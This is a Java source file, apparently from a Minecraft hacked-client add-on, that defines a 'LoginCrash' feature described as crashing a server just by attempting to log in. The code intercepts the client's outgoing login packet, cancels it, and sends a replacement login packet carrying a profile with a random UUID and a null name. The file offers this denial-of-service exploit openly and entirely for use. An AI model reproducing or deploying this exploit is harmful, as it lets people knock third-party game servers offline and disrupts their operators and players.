package me.dustin.crash.feature;

import com.mojang.authlib.GameProfile;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.ClientPacketFilter;
import me.dustin.jex.event.packet.EventPacketSent;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;

import java.util.UUID;


@Feature.Manifest(name = "Login", category = Feature.Category.MISC, description = "Crash a server just by attempting to login. Disables after an attempt.")
public class LoginCrash extends Feature {

    private final GameProfile gameProfile = new GameProfile(UUID.randomUUID(), null);

    public LoginCrash() {
        super();
        //since the annotation requires a constant we just set it originally as MISC and change to CRASH as soon as we can
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventPacketSent> eventPacketSentEventListener = new EventListener<>(eventPacketSent -> {
        toggleState();
        eventPacketSent.cancel();
        NetworkHelper.INSTANCE.sendPacket(new LoginHelloC2SPacket(gameProfile));
    }, new ClientPacketFilter(EventPacketSent.Mode.PRE, LoginHelloC2SPacket.class));

}
